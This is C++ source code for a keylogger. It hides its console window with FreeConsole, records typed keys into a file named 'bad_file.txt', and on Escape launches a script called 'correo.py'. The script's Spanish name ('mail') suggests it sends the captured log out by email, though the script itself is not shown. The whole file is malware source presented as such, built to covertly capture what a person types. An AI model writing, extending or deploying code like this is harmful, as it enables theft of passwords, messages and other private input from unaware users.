#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>
#include <conio.h>
#include <windows.h>
using namespace std;

class Keylogger
{
private:
  string line_;

  bool end_process;

  ofstream bad_file;

public:
  Keylogger()

  {

    this->line_ = "";

    this->end_process = false;
  }

  void Capture_Keys()

  {
    this->bad_file.open("bad_file.txt", ios::app);

    if (this->bad_file.fail())

    {

      cout << "Error pendejo!" << endl;
    }

    else

    {

      do

      {

        if (kbhit())

        {

          char tecla = getch();

          if (tecla == 27)

          {

            this->end_process = true;

            system("correo.py");
          }

          else

          {
            this->line_ += tecla;

            if (this->line_.length() > 50 || tecla == 32 || tecla == 13)

            {
              this->bad_file << this->line_ << endl;
              this->line_ = "";
            }
          }
        }

      } while (!this->end_process);

      this->bad_file.close();
    }
  }
};

int main()

{

  FreeConsole();

  Keylogger x;

  x.Capture_Keys();

  system("pause");
}
